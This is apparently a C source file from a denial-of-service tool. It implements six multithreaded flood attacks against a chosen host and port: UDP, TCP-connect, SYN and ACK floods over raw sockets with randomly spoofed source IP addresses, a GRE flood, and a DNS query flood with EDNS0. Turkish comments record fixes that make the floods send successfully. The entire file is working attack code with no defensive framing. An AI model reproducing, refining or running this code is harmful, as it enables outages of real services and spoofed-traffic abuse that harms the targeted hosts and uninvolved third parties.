#include "attack.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <pthread.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>

static int resolve_host(const char *host, struct in_addr *out)
{
    if (inet_aton(host, out))
        return 0;
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof hints);
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, NULL, &hints, &res) != 0)
        return -1;
    *out = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
    freeaddrinfo(res);
    return 0;
}

static void rps_throttle(int rps, int threads)
{
    if (rps <= 0 || threads <= 0)
        return;
    int per_thread = rps / threads;
    if (per_thread <= 0) per_thread = 1;
    long us = 1000000L / per_thread;
    if (us > 0) usleep((useconds_t)us);
}

static unsigned short checksum(unsigned short *buf, int len)
{
    unsigned long sum = 0;
    while (len > 1) { sum += *buf++; len -= 2; }
    if (len) sum += *(unsigned char *)buf;
    sum  = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

struct pseudo_hdr {
    uint32_t src;
    uint32_t dst;
    uint8_t  zero;
    uint8_t  proto;
    uint16_t len;
};

/* Stack buffer — heap alloc yok, her paket icin cagrilabilir */
static unsigned short tcp_checksum_nopayload(struct iphdr *iph,
                                              struct tcphdr *tcph)
{
    unsigned char buf[sizeof(struct pseudo_hdr) + sizeof(struct tcphdr)];
    struct pseudo_hdr ph;
    ph.src   = iph->saddr;
    ph.dst   = iph->daddr;
    ph.zero  = 0;
    ph.proto = IPPROTO_TCP;
    ph.len   = htons((uint16_t)sizeof(struct tcphdr));
    memcpy(buf,             &ph,  sizeof ph);
    memcpy(buf + sizeof ph, tcph, sizeof(struct tcphdr));
    return checksum((unsigned short *)buf,
                    (int)(sizeof(struct pseudo_hdr) + sizeof(struct tcphdr)));
}

static unsigned short udp_checksum(struct iphdr *iph, struct udphdr *udph,
                                    char *data, int data_len)
{
    struct pseudo_hdr ph;
    ph.src = iph->saddr; ph.dst = iph->daddr;
    ph.zero = 0; ph.proto = IPPROTO_UDP;
    ph.len = htons(sizeof(struct udphdr) + data_len);
    int total = sizeof(ph) + sizeof(struct udphdr) + data_len;
    char *buf = calloc(1, total);
    if (!buf) return 0;
    memcpy(buf,                    &ph,  sizeof ph);
    memcpy(buf + sizeof ph,        udph, sizeof(struct udphdr));
    if (data && data_len > 0)
        memcpy(buf + sizeof ph + sizeof(struct udphdr), data, data_len);
    unsigned short cs = checksum((unsigned short *)buf, total);
    free(buf);
    return cs;
}

typedef struct {
    char host[256];
    int  port;
    int  duration;
    int  threads;
    int  rps;
} attack_args_t;

/* ============================================================
 *  1. UDPFLOOD
 * ============================================================ */
static void *udpflood_worker(void *arg)
{
    attack_args_t *a = (attack_args_t *)arg;
    struct in_addr dst;
    if (resolve_host(a->host, &dst) < 0) return NULL;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return NULL;

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof sin);
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(a->port);
    sin.sin_addr   = dst;

    unsigned int seed = (unsigned int)(time(NULL) ^ (uintptr_t)arg);
    char payload[1024];
    for (int i = 0; i < (int)sizeof payload; i++)
        payload[i] = (char)(rand_r(&seed) & 0xFF);

    time_t end = time(NULL) + a->duration;
    while (time(NULL) < end) {
        sendto(sock, payload, sizeof payload, 0,
               (struct sockaddr *)&sin, sizeof sin);
        rps_throttle(a->rps, a->threads);
    }
    close(sock);
    return NULL;
}

void start_udpflood(const char *host, int port, int duration, int threads, int rps)
{
    pthread_t     *tids = malloc(sizeof(pthread_t)     * threads);
    attack_args_t *args = malloc(sizeof(attack_args_t) * threads);
    for (int i = 0; i < threads; i++) {
        strncpy(args[i].host, host, sizeof args[i].host - 1);
        args[i].host[sizeof args[i].host - 1] = '\0';
        args[i].port = port; args[i].duration = duration;
        args[i].threads = threads; args[i].rps = rps;
        pthread_create(&tids[i], NULL, udpflood_worker, &args[i]);
    }
    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
    free(tids); free(args);
}

/* ============================================================
 *  2. TCPFLOOD
 * ============================================================ */
static const char *TCP_PAYLOAD = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n";

static void *tcpflood_worker(void *arg)
{
    attack_args_t *a = (attack_args_t *)arg;
    struct in_addr dst;
    if (resolve_host(a->host, &dst) < 0) return NULL;

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof sin);
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(a->port);
    sin.sin_addr   = dst;

    time_t end = time(NULL) + a->duration;
    while (time(NULL) < end) {
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) continue;
        struct timeval tv = {1, 0};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv);
        if (connect(sock, (struct sockaddr *)&sin, sizeof sin) == 0)
            send(sock, TCP_PAYLOAD, strlen(TCP_PAYLOAD), 0);
        close(sock);
        rps_throttle(a->rps, a->threads);
    }
    return NULL;
}

void start_tcpflood(const char *host, int port, int duration, int threads, int rps)
{
    pthread_t     *tids = malloc(sizeof(pthread_t)     * threads);
    attack_args_t *args = malloc(sizeof(attack_args_t) * threads);
    for (int i = 0; i < threads; i++) {
        strncpy(args[i].host, host, sizeof args[i].host - 1);
        args[i].host[sizeof args[i].host - 1] = '\0';
        args[i].port = port; args[i].duration = duration;
        args[i].threads = threads; args[i].rps = rps;
        pthread_create(&tids[i], NULL, tcpflood_worker, &args[i]);
    }
    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
    free(tids); free(args);
}

/* ============================================================
 *  3. SYNFLOOD
 *
 *  FIX: Payload kaldirildi — 65 KB payload EMSGSIZE hatasi
 *       veriyordu, sendto() sessizce basarisiz oluyordu ve
 *       dongu aninda bitiyordu. Gercek SYN flood'da payload
 *       olmaz. Stack buffer ile checksum, rand_r ile thread-safe.
 * ============================================================ */
static void *synflood_worker(void *arg)
{
    attack_args_t *a = (attack_args_t *)arg;
    struct in_addr dst;
    if (resolve_host(a->host, &dst) < 0) return NULL;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) { perror("[SYNFLOOD] socket"); return NULL; }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof one);

    int pkt_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    memset(packet, 0, pkt_len);

    struct iphdr  *iph  = (struct iphdr  *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof sin);
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(a->port);
    sin.sin_addr   = dst;

    unsigned int seed = (unsigned int)(time(NULL) ^ (uintptr_t)arg);

    time_t end = time(NULL) + a->duration;
    while (time(NULL) < end) {
        uint16_t src_port = (uint16_t)(1024 + rand_r(&seed) % 52024);
        uint32_t seq      = (uint32_t)rand_r(&seed);

        iph->ihl      = 5;
        iph->version  = 4;
        iph->tos      = 0;
        iph->tot_len  = htons((uint16_t)pkt_len);
        iph->id       = htons((uint16_t)rand_r(&seed));
        iph->frag_off = 0;
        iph->ttl      = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check    = 0;
        iph->saddr    = rand_r(&seed);
        iph->daddr    = dst.s_addr;
        iph->check    = checksum((unsigned short *)iph, sizeof(struct iphdr));

        tcph->source  = htons(src_port);
        tcph->dest    = htons(a->port);
        tcph->seq     = htonl(seq);
        tcph->ack_seq = 0;
        tcph->doff    = 5;
        tcph->syn     = 1;
        tcph->ack     = 0;
        tcph->window  = htons(65535);
        tcph->check   = 0;
        tcph->urg_ptr = 0;
        tcph->check   = tcp_checksum_nopayload(iph, tcph);

        sendto(sock, packet, pkt_len, 0,
               (struct sockaddr *)&sin, sizeof sin);
        rps_throttle(a->rps, a->threads);
    }
    close(sock);
    return NULL;
}

void start_synflood(const char *host, int port, int duration, int threads, int rps)
{
    pthread_t     *tids = malloc(sizeof(pthread_t)     * threads);
    attack_args_t *args = malloc(sizeof(attack_args_t) * threads);
    for (int i = 0; i < threads; i++) {
        strncpy(args[i].host, host, sizeof args[i].host - 1);
        args[i].host[sizeof args[i].host - 1] = '\0';
        args[i].port = port; args[i].duration = duration;
        args[i].threads = threads; args[i].rps = rps;
        pthread_create(&tids[i], NULL, synflood_worker, &args[i]);
    }
    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
    free(tids); free(args);
}

/* ============================================================
 *  4. ACKFLOOD
 *
 *  FIX: Ayni sorunlar — payload kaldirildi, stack checksum,
 *       rand_r ile thread-safe.
 * ============================================================ */
static void *ackflood_worker(void *arg)
{
    attack_args_t *a = (attack_args_t *)arg;
    struct in_addr dst;
    if (resolve_host(a->host, &dst) < 0) return NULL;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) { perror("[ACKFLOOD] socket"); return NULL; }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof one);

    int pkt_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    memset(packet, 0, pkt_len);

    struct iphdr  *iph  = (struct iphdr  *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof sin);
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(a->port);
    sin.sin_addr   = dst;

    unsigned int seed = (unsigned int)(time(NULL) ^ (uintptr_t)arg);

    time_t end = time(NULL) + a->duration;
    while (time(NULL) < end) {
        uint16_t src_port = (uint16_t)(1024 + rand_r(&seed) % 64312);
        uint32_t seq      = (uint32_t)rand_r(&seed);
        uint32_t ack_seq  = (uint32_t)rand_r(&seed);

        iph->ihl      = 5;
        iph->version  = 4;
        iph->tos      = 0;
        iph->tot_len  = htons((uint16_t)pkt_len);
        iph->id       = htons((uint16_t)rand_r(&seed));
        iph->frag_off = 0;
        iph->ttl      = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check    = 0;
        iph->saddr    = rand_r(&seed);
        iph->daddr    = dst.s_addr;
        iph->check    = checksum((unsigned short *)iph, sizeof(struct iphdr));

        tcph->source  = htons(src_port);
        tcph->dest    = htons(a->port);
        tcph->seq     = htonl(seq);
        tcph->ack_seq = htonl(ack_seq);
        tcph->doff    = 5;
        tcph->syn     = 0;
        tcph->ack     = 1;
        tcph->window  = htons(65535);
        tcph->check   = 0;
        tcph->urg_ptr = 0;
        tcph->check   = tcp_checksum_nopayload(iph, tcph);

        sendto(sock, packet, pkt_len, 0,
               (struct sockaddr *)&sin, sizeof sin);
        rps_throttle(a->rps, a->threads);
    }
    close(sock);
    return NULL;
}

void start_ackflood(const char *host, int port, int duration, int threads, int rps)
{
    pthread_t     *tids = malloc(sizeof(pthread_t)     * threads);
    attack_args_t *args = malloc(sizeof(attack_args_t) * threads);
    for (int i = 0; i < threads; i++) {
        strncpy(args[i].host, host, sizeof args[i].host - 1);
        args[i].host[sizeof args[i].host - 1] = '\0';
        args[i].port = port; args[i].duration = duration;
        args[i].threads = threads; args[i].rps = rps;
        pthread_create(&tids[i], NULL, ackflood_worker, &args[i]);
    }
    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
    free(tids); free(args);
}

/* ============================================================
 *  5. GREFLOOD
 *
 *  FIX: IPPROTO_GRE yerine IPPROTO_RAW kullaniliyor.
 *       SOCK_RAW+IPPROTO_GRE acilinca Linux kernel IP header'i
 *       kendisi ekliyor; IP_HDRINCL ile catisiyor ve sendto
 *       EINVAL/EPERM doniyor. IPPROTO_RAW ile IP header
 *       tamamen bizim kontrolumuzde.
 *  FIX: Payload 1400 byte — MTU uyumlu, EMSGSIZE yok.
 *  FIX: rand_r ile thread-safe.
 * ============================================================ */
#define GRE_PAYLOAD_LEN 1400

struct gre_hdr {
    uint16_t flags;
    uint16_t proto;
};

static void *greflood_worker(void *arg)
{
    attack_args_t *a = (attack_args_t *)arg;
    struct in_addr dst;
    if (resolve_host(a->host, &dst) < 0) return NULL;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { perror("[GREFLOOD] socket"); return NULL; }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof one);

    int pkt_len = sizeof(struct iphdr) + sizeof(struct gre_hdr) + GRE_PAYLOAD_LEN;
    char *packet = calloc(1, pkt_len);
    if (!packet) { close(sock); return NULL; }

    struct iphdr   *iph  = (struct iphdr   *)packet;
    struct gre_hdr *greh = (struct gre_hdr *)(packet + sizeof(struct iphdr));
    char           *data = packet + sizeof(struct iphdr) + sizeof(struct gre_hdr);

    greh->flags = 0;
    greh->proto = htons(0x0800);

    unsigned int seed = (unsigned int)(time(NULL) ^ (uintptr_t)arg);
    for (int i = 0; i < GRE_PAYLOAD_LEN; i++)
        data[i] = (char)(rand_r(&seed) & 0xFF);

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof sin);
    sin.sin_family = AF_INET;
    sin.sin_addr   = dst;

    time_t end = time(NULL) + a->duration;
    while (time(NULL) < end) {
        iph->ihl      = 5;
        iph->version  = 4;
        iph->tos      = 0;
        iph->tot_len  = htons((uint16_t)pkt_len);
        iph->id       = htons((uint16_t)rand_r(&seed));
        iph->frag_off = 0;
        iph->ttl      = 64;
        iph->protocol = IPPROTO_GRE;
        iph->check    = 0;
        iph->saddr    = rand_r(&seed);
        iph->daddr    = dst.s_addr;
        iph->check    = checksum((unsigned short *)iph, sizeof(struct iphdr));

        sendto(sock, packet, pkt_len, 0,
               (struct sockaddr *)&sin, sizeof sin);
        rps_throttle(a->rps, a->threads);
    }
    free(packet);
    close(sock);
    return NULL;
}

void start_greflood(const char *host, int port, int duration, int threads, int rps)
{
    (void)port;
    pthread_t     *tids = malloc(sizeof(pthread_t)     * threads);
    attack_args_t *args = malloc(sizeof(attack_args_t) * threads);
    for (int i = 0; i < threads; i++) {
        strncpy(args[i].host, host, sizeof args[i].host - 1);
        args[i].host[sizeof args[i].host - 1] = '\0';
        args[i].port = port; args[i].duration = duration;
        args[i].threads = threads; args[i].rps = rps;
        pthread_create(&tids[i], NULL, greflood_worker, &args[i]);
    }
    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
    free(tids); free(args);
}

/* ============================================================
 *  6. DNSFLOOD
 * ============================================================ */
static const char *dns_domains[] = {
    "google.com",    "youtube.com",   "facebook.com",
    "amazon.com",    "twitter.com",   "reddit.com",
    "github.com",    "cloudflare.com","microsoft.com",
    "apple.com",     "netflix.com",   "wikipedia.org",
    "stackoverflow.com","linkedin.com","instagram.com",
    NULL
};

static int dns_domains_count = 15;
static uint16_t dns_qtypes[] = {1, 28, 15, 2};

static int build_dns_query(char *buf, int buflen,
                            const char *domain, uint16_t qtype,
                            unsigned int *seed)
{
    if (buflen < 512) return -1;
    memset(buf, 0, buflen);
    int pos = 0;

    uint16_t txid = (uint16_t)rand_r(seed);
    buf[pos++] = (txid >> 8) & 0xFF;
    buf[pos++] =  txid       & 0xFF;
    buf[pos++] = 0x01; buf[pos++] = 0x00;
    buf[pos++] = 0x00; buf[pos++] = 0x01;
    buf[pos++] = 0x00; buf[pos++] = 0x00;
    buf[pos++] = 0x00; buf[pos++] = 0x00;
    buf[pos++] = 0x00; buf[pos++] = 0x01;

    const char *p = domain;
    while (*p) {
        const char *dot = strchr(p, '.');
        int label_len = dot ? (int)(dot - p) : (int)strlen(p);
        buf[pos++] = (char)label_len;
        memcpy(buf + pos, p, label_len);
        pos += label_len;
        if (!dot) break;
        p = dot + 1;
    }
    buf[pos++] = 0x00;
    buf[pos++] = (qtype >> 8) & 0xFF;
    buf[pos++] =  qtype       & 0xFF;
    buf[pos++] = 0x00; buf[pos++] = 0x01;

    /* EDNS0 OPT RR */
    buf[pos++] = 0x00;
    buf[pos++] = 0x00; buf[pos++] = 0x29;
    buf[pos++] = 0x10; buf[pos++] = 0x00;
    buf[pos++] = 0x00; buf[pos++] = 0x00;
    buf[pos++] = 0x00; buf[pos++] = 0x00;
    buf[pos++] = 0x00; buf[pos++] = 0x00;
    return pos;
}

static void *dnsflood_worker(void *arg)
{
    attack_args_t *a = (attack_args_t *)arg;
    struct in_addr dst;
    if (resolve_host(a->host, &dst) < 0) return NULL;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return NULL;

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof sin);
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(a->port);
    sin.sin_addr   = dst;

    unsigned int seed = (unsigned int)(time(NULL) ^ (uintptr_t)arg);
    char buf[512];

    time_t end = time(NULL) + a->duration;
    while (time(NULL) < end) {
        const char *domain = dns_domains[rand_r(&seed) % dns_domains_count];
        uint16_t    qtype  = dns_qtypes[rand_r(&seed) % 4];
        int plen = build_dns_query(buf, sizeof buf, domain, qtype, &seed);
        if (plen > 0)
            sendto(sock, buf, plen, 0,
                   (struct sockaddr *)&sin, sizeof sin);
        rps_throttle(a->rps, a->threads);
    }
    close(sock);
    return NULL;
}

void start_dnsflood(const char *host, int port, int duration, int threads, int rps)
{
    pthread_t     *tids = malloc(sizeof(pthread_t)     * threads);
    attack_args_t *args = malloc(sizeof(attack_args_t) * threads);
    for (int i = 0; i < threads; i++) {
        strncpy(args[i].host, host, sizeof args[i].host - 1);
        args[i].host[sizeof args[i].host - 1] = '\0';
        args[i].port = port; args[i].duration = duration;
        args[i].threads = threads; args[i].rps = rps;
        pthread_create(&tids[i], NULL, dnsflood_worker, &args[i]);
    }
    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
    free(tids); free(args);
}

